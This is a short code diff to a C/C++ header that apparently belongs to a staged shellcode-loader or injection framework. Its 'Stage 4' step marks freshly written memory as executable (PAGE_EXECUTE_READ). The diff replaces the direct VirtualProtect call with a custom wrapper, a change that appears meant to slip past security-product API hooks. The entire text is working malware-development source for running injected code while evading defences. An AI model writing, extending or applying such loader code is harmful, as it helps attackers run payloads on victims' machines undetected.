@@ -1,4 +1,5 @@
 #pragma once
+#include "../../api/api_wrappers.h"
 #include "../../core/utils.h"
 #include "../context.h"
 
@@ -13,11 +14,11 @@ inline BOOL Stage4_Write_Local_RX(TechniqueContext* ctx)
     DEBUG_MSG("Stage 4", "Memcpy done, flipping protection to PAGE_EXECUTE_READ");
 #endif
 
-    DWORD oldProtect = 0;
-    if (!VirtualProtect(ctx->allocated_mem, ctx->length,
-                        PAGE_EXECUTE_READ, &oldProtect)) {
+    ULONG oldProtect = 0;
+    if (!MyVirtualProtect(ctx->allocated_mem, ctx->length,
+                          PAGE_EXECUTE_READ, &oldProtect)) {
 #ifdef DEBUG_MODE
-        DEBUG_MSG("Stage 4", "VirtualProtect failed (err=%lu)", GetLastError());
+        DEBUG_MSG("Stage 4", "VirtualProtect failed");
 #endif
         return FALSE;
     }
